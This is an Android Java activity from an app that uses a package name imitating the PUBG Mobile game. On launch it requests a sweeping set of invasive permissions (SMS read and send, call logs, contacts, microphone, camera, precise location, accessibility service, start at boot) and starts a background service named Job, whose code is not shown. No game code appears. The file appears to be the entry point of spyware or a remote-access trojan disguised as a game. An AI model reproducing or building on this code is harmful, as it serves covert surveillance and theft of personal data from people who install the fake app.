package com.pubg.imobile;


import android.content.Intent;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    private static final int ALL_PERMISSIONS_REQUEST_CODE = 123;
    private final String[] permissions = {"android.permission.INTERNET", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND", "android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND", "android.permission.BIND_ACCESSIBILITY_SERVICE" , "android.permission.ACCESS_WIFI_STATE", "android.permission.CHANGE_WIFI_STATE", "android.permission.ACCESS_NETWORK_STATE", "android.permission.ACCESS_COARSE_LOCATION", "android.permission.ACCESS_FINE_LOCATION", "android.permission.READ_PHONE_STATE", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.RECORD_AUDIO", "android.permission.CALL_PHONE", "android.permission.READ_CONTACTS", "android.permission.WRITE_CONTACTS", "android.permission.WRITE_SETTINGS", "android.permission.CAMERA", "android.permission.READ_SMS", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.RECEIVE_BOOT_COMPLETED", "android.permission.SET_WALLPAPER", "android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG", "android.permission.WAKE_LOCK", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE",  "android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO", "android.permission.READ_MEDIA_AUDIO"};
        protected void onCreate (Bundle savedInstanceState){
            super.onCreate(savedInstanceState);
            ActivityCompat.requestPermissions(this, this.permissions, ALL_PERMISSIONS_REQUEST_CODE);
            Intent intent = new Intent(this, Job.class);
            this.startService(intent);
    }
}





